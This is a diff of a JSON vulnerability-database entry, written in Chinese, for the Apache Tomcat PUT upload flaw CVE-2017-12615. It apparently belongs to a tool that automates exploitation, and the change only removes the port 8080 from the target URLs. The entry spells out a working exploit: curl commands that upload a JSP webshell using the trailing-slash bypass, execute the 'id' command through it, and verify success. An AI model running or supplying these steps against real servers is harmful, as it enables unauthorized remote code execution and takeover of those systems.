@@ -25,24 +25,24 @@
     "/shell.jsp/",
     "/test.txt"
   ],
-  "detection_method": "发送PUT请求到目标URL（如 http://{TARGET}:8080/test.txt），如果返回HTTP状态码201 Created，说明PUT方法可用，可能存在漏洞。",
+  "detection_method": "发送PUT请求到目标URL（如 http://{TARGET}/test.txt），如果返回HTTP状态码201 Created，说明PUT方法可用，可能存在漏洞。",
   "exploit_steps": [
     {
       "step": 1,
       "description": "上传JSP webshell，通过在路径后添加/绕过后缀检测。",
-      "command": "curl -X PUT \"http://{TARGET}:8080/shell.jsp/\" -d '<%out.println(new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next());%>'",
+      "command": "curl -X PUT \"http://{TARGET}/shell.jsp/\" -d '<%out.println(new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next());%>'",
       "expected_result": "返回HTTP状态码201 Created，表示文件上传成功。",
       "notes": "使用/绕过Tomcat对.jsp后缀的检测，确保路径以/结尾。"
     },
     {
       "step": 2,
       "description": "访问上传的webshell以执行命令。",
-      "command": "curl \"http://{TARGET}:8080/shell.jsp\"",
+      "command": "curl \"http://{TARGET}/shell.jsp\"",
       "expected_result": "返回命令执行结果，如uid=...，表示远程代码执行成功。",
       "notes": "访问时去掉路径末尾的/，直接请求.jsp文件。"
     }
   ],
-  "verification_command": "curl -X PUT \"http://{TARGET}:8080/test.txt\" -d \"test content\"",
+  "verification_command": "curl -X PUT \"http://{TARGET}/test.txt\" -d \"test content\"",
   "verification_success_sign": "HTTP/1.1 201 Created",
   "requires_callback": false,
   "callback_note": "此漏洞不需要目标回连攻击机，通过上传并访问JSP webshell直接执行命令。",
@@ -56,7 +56,7 @@
     "JSP",
     "webshell"
   ],
-  "search_text": "Apache Tomcat 8.5.19 版本中，由于web.xml配置readonly=false，允许通过PUT方法上传文件，结合路径后缀绕过（如添加/）可上传JSP webshell，导致远程代码执行。 file_upload CVE-2017-12615 Tomcat CVE-2017-12615 PUT上传 任意写文件 Apache Tomcat 8.5.19 Tomcat/8.5.19 Apache Tomcat PUT method enabled 发送PUT请求到目标URL（如 http://{TARGET}:8080/test.txt），如果返回HTTP状态码201 Created，说明PUT方法可用，可能存在漏洞。 Apache Tomcat 8.5.19 Tomcat CVE-2017-12615 PUT 文件上传 RCE JSP webshell 上传JSP webshell，通过在路径后添加/绕过后缀检测。 访问上传的webshell以执行命令。",
+  "search_text": "Apache Tomcat 8.5.19 版本中，由于web.xml配置readonly=false，允许通过PUT方法上传文件，结合路径后缀绕过（如添加/）可上传JSP webshell，导致远程代码执行。 file_upload CVE-2017-12615 Tomcat CVE-2017-12615 PUT上传 任意写文件 Apache Tomcat 8.5.19 Tomcat/8.5.19 Apache Tomcat PUT method enabled 发送PUT请求到目标URL（如 http://{TARGET}/test.txt），如果返回HTTP状态码201 Created，说明PUT方法可用，可能存在漏洞。 Apache Tomcat 8.5.19 Tomcat CVE-2017-12615 PUT 文件上传 RCE JSP webshell 上传JSP webshell，通过在路径后添加/绕过后缀检测。 访问上传的webshell以执行命令。",
   "embedding": [
     0.13204047083854675,
     -0.09733981639146805,
